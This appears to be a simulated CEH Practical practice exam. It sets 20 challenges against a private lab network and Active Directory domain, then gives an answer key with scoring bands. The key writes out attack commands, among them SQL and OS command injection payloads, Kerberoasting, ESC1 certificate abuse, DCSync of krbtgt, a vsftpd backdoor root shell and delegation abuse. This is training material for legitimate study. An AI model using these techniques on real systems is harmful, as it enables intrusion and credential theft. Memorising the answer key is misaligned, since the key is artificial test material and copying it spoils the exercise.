# Simulated Practical Exam 02

> **6 hours · 20 challenges · ~18 min each · pass ≈ 14/20 (~70%).** Exam 02 leans **harder than [Exam 01](exam-01.md)**: more Active Directory, more multi-step work, and two **chained** challenges where the answer to one attack feeds the next. Sit it in one timed block, no peeking at the key, and screenshot every answer before you submit.
>
> **Setup:** [lab](../../labs/README.md) running — Kali `192.168.56.10`, Metasploitable2 `192.168.56.20` (`msfadmin`), DC/ADCS `192.168.56.30` = `ceh.lab` (`jdoe` / `Passw0rd!`), member `ws01` `192.168.56.31`, Docker web `localhost:8081–8084` — plus the [challenge-lab](../challenge-lab/README.md) generated to `~/ceh-practical-challenges/` (`C=~/ceh-practical-challenges`). Recipes stay open: [challenge-playbooks.md](../challenge-playbooks.md).

## Challenges

### Challenge 1 — Database fingerprint ⏱️ 6 min
**Q:** What is the exact version string of the MySQL service running on the Linux target?
**Target:** `192.168.56.20`, TCP 3306.

### Challenge 2 — Symmetric decryption ⏱️ 6 min
**Q:** `secret.aes.enc` was encrypted with AES-256-CBC (PBKDF2); the passphrase is recorded in the challenge README. Decrypt it and submit the flag.
**Artifact:** `$C/crypto/secret.aes.enc` (+ `$C/crypto/README.txt`).

### Challenge 3 — Roastable service account ⏱️ 12 min
**Q:** One domain service account carries a registered SPN and a crackable password. What is its **full servicePrincipalName** string?
**Target:** `ceh.lab` DC at `192.168.56.30` (auth as `jdoe`).

### Challenge 4 — Passphrase-protected stego ⏱️ 8 min
**Q:** `beach.jpg` hides a flag with steghide. The embed passphrase is `hacktheplanet`. Extract and submit the flag.
**Artifact:** `$C/stego/beach.jpg`.

### Challenge 5 — SQL injection to a credential ⏱️ 12 min
**Q:** On DVWA (security = low), dump the stored password hash for the `admin` user, then crack it. What is admin's **plaintext** password?
**Target:** `localhost:8081` (DVWA SQL injection page).

### Challenge 6 — Sniffed login ⏱️ 8 min
**Q:** The capture holds one HTTP login POST. What is the **password** submitted in that request?
**Artifact:** `$C/pcap/traffic.pcap`.

### Challenge 7 — Delegation weakness ⏱️ 15 min
**Q:** Exactly one computer object in the domain is trusted for **unconstrained delegation**. Name that host.
**Target:** `ceh.lab` DC at `192.168.56.30` (auth as `jdoe`).

### Challenge 8 — Crack the shadow hash ⏱️ 5 min
**Q:** The fourth line of `hashes.txt` is a `$6$` (sha512crypt) hash. What is its plaintext?
**Artifact:** `$C/hashes/hashes.txt`.

### Challenge 9 — Anonymous share ⏱️ 8 min
**Q:** List the SMB shares on the Linux target with a null session. Which non-administrative share is reachable **without credentials**?
**Target:** `192.168.56.20`, TCP 139/445.

### Challenge 10 — Layered encoding ⏱️ 6 min
**Q:** `mystery.txt` is a flag wrapped in three stacked transforms. Peel them and submit the flag.
**Artifact:** `$C/crypto/mystery.txt`.

### Challenge 11 — Vulnerable certificate template ⏱️ 15 min
**Q:** The AD Certificate Services CA publishes one template that is vulnerable to **ESC1** (enrollee supplies subject + client-auth EKU, enrollable by Domain Users). What is the **template name**?
**Target:** ADCS on `192.168.56.30` (auth as `jdoe`).

### Challenge 12 — WPA handshake ⏱️ 10 min
**Q:** Using the aircrack-ng sample WPA capture (`wpa.cap` from the aircrack-ng test data), recover the Wi-Fi passphrase.
**Artifact:** aircrack-ng sample `wpa.cap` (BSSID `00:14:6C:7E:40:80`, ESSID `test`).

### Challenge 13 — Command injection ⏱️ 10 min
**Q:** On DVWA's Command Injection page (security = low), inject an OS command that returns the identity of the web-server process. What is the **user name** the web server runs as?
**Target:** `localhost:8081` (DVWA Command Injection page).

### Challenge 14 — Cracked archive (chained) ⏱️ 10 min
**Q:** `secret.zip` is password-protected. Crack the ZIP password, extract the archive, and submit the **flag inside** (not the password).
**Artifact:** `$C/archives/secret.zip`.

### Challenge 15 — The roast-proof account ⏱️ 10 min
**Q:** Two service identities exist in the domain; one cannot be Kerberoasted because it uses a managed 128-character password. Name that **roast-proof** account.
**Target:** `ceh.lab` DC at `192.168.56.30` (auth as `jdoe`).

### Challenge 16 — Screen-sharing brute force ⏱️ 8 min
**Q:** The Linux target exposes a VNC service on TCP 5900 that has no username and a weak password. What is the **VNC password**?
**Target:** `192.168.56.20`, TCP 5900.

### Challenge 17 — Carved payload ⏱️ 6 min
**Q:** `cat.jpg` has a second file appended after the image data. Carve it out and submit the flag it contains.
**Artifact:** `$C/stego/cat.jpg`.

### Challenge 18 — Replicate the crown jewels ⏱️ 20 min
**Q:** After you reach domain-privileged access, a DCSync of exactly one account yields golden-ticket capability over the whole domain. Which **account** is that?
**Target:** `ceh.lab` DC at `192.168.56.30`.

### Challenge 19 — Backdoor to root ⏱️ 12 min
**Q:** Exploit a backdoored service on the Linux target to land a shell, then run `id`. What is the **first field** of the output (the `uid=...` token)?
**Target:** `192.168.56.20`.

### Challenge 20 — Delegation to impersonation (chained) ⏱️ 25 min
**Q:** `jdoe` holds `GenericWrite` over `ws01`. Abuse it with resource-based constrained delegation to obtain a service ticket as **Administrator to `ws01`**. What **SPN** do you request that impersonation ticket for?
**Target:** `ws01` `192.168.56.31` via the DC at `192.168.56.30`.

---

## Answer key

<details><summary>Reveal the answer key</summary>

| # | Answer | Method (module) |
|---|---|---|
| 1 | `5.0.51a-3ubuntu5` | `nmap -sV -p3306 192.168.56.20` — read the MySQL VERSION (M02 recon) |
| 2 | `CEH{aes_with_a_known_key}` | `openssl enc -d -aes-256-cbc -pbkdf2 -k s3cr3tkey -in $C/crypto/secret.aes.enc` (M20 crypto) |
| 3 | `MSSQLSvc/sql01.ceh.lab:1433` | `impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30` → `svc-sql`'s SPN (M06 AD) |
| 4 | `CEH{steghide_embedded_flag}` | `steghide extract -sf $C/stego/beach.jpg -p hacktheplanet` (M20 stego) |
| 5 | `password` | `1' UNION SELECT user,password FROM users -- -` (or sqlmap) → MD5 `5f4dcc3b...` → `hashcat -m 0` (M13/M15) |
| 6 | `Summer2025!` | Wireshark → Follow TCP Stream, or `tshark -r $C/pcap/traffic.pcap -Y http.request.method==POST -T fields -e http.file_data` (M08) |
| 7 | `ws01` (`ws01.ceh.lab`) | `nxc ldap 192.168.56.30 -u jdoe -p 'Passw0rd!' --trusted-for-delegation`, or BloodHound / PowerView `Get-DomainComputer -Unconstrained` (M06) |
| 8 | `iloveyou` | `hashid` → `hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt` (M15 crypto) |
| 9 | `tmp` | `smbclient -L //192.168.56.20 -N`, or `nxc smb 192.168.56.20 -u '' -p '' --shares` → the `tmp` share (M04 enum) |
| 10 | `CEH{layered_encoding_is_not_encryption}` | `cat $C/crypto/mystery.txt \| base64 -d \| tr 'A-Za-z' 'N-ZA-Mn-za-m' \| xxd -r -p` (CyberChef "Magic") (M20) |
| 11 | `ESC1-Vuln` | `certipy find -u jdoe@ceh.lab -p 'Passw0rd!' -dc-ip 192.168.56.30 -vulnerable -stdout` (M06 ADCS) |
| 12 | `biscotte` | `aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa.cap` → KEY FOUND for ESSID `test` (M16 wireless) |
| 13 | `www-data` | DVWA Command Injection: `127.0.0.1; id` → read the `uid=33(www-data)` line (M13 web) |
| 14 | `CEH{cracked_the_zip_password}` | `zip2john $C/archives/secret.zip > z.hash; john z.hash` → pw `letmein` → `unzip -P letmein` → read `.flag.txt` (chained, M15) |
| 15 | `gmsa-web` | `nxc ldap 192.168.56.30 -u jdoe -p 'Passw0rd!' --query` / `Get-ADServiceAccount -Filter *` → the gMSA (M06 AD) |
| 16 | `password` | `hydra -s 5900 -P /usr/share/wordlists/rockyou.txt 192.168.56.20 vnc`, or msf `auxiliary/scanner/vnc/vnc_login` (M06) |
| 17 | `CEH{carved_from_the_image}` | `binwalk -e $C/stego/cat.jpg` (or `foremost -i cat.jpg`) → read the carved `.txt` (M20 stego) |
| 18 | `krbtgt` | `impacket-secretsdump ceh.lab/administrator@192.168.56.30 -just-dc-user krbtgt` (M06 AD) |
| 19 | `uid=0(root)` | msf `exploit/unix/ftp/vsftpd_234_backdoor` (or `multi/samba/usermap_script`) → shell → `id` (M20 exploitation/privesc) |
| 20 | `cifs/ws01.ceh.lab` | `impacket-rbcd ... -delegate-to 'ws01$' -action write` then `impacket-getST -spn cifs/ws01.ceh.lab -impersonate Administrator` (chained, M06) |

</details>

## Scoring

Mark each answer right only if it matches **exactly** — case, punctuation, and trailing characters count (`Summer2025!`, `MSSQLSvc/sql01.ceh.lab:1433`, `uid=0(root)`).

| Score | Band | What to do next |
|---|---|---|
| **18–20** | Exam-ready, with margin | You are pacing well under time — book with confidence. |
| **14–17** | **Pass (≈70%)** | You'd pass, but re-drill the domains you dropped so a bad draw can't sink you. |
| **10–13** | Borderline | Rework each missed domain in [`../drills/`](../drills/README.md) until it's ✅ under time, then re-sit. |
| **< 10** | Not yet | Go back to the per-domain packs in [`../drills/`](../drills/README.md) and regenerate the [`../challenge-lab/`](../challenge-lab/README.md) artifacts; build fluency before another full run. |

**After scoring:** for every miss, note the domain (M02 recon, M04 enum, M06 AD, M08 sniffing, M13 web, M15 crypto/passwords, M16 wireless, M20 stego/exploit) and re-drill it — the AD-heavy items (3, 7, 11, 15, 18, 20) and the two chained ones (14, 20) are where this exam is deliberately harder than Exam 01. Log results in [`../../PROGRESS.md`](../../PROGRESS.md), then take Exam 01 or regenerate a fresh challenge-lab set and go again.

> Practice simulation on your own lab — **not** real or leaked exam content. The Practical is performance-based; there is nothing to "dump." Confirm the official pass mark on the [EC-Council Practical page](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh-practical/).
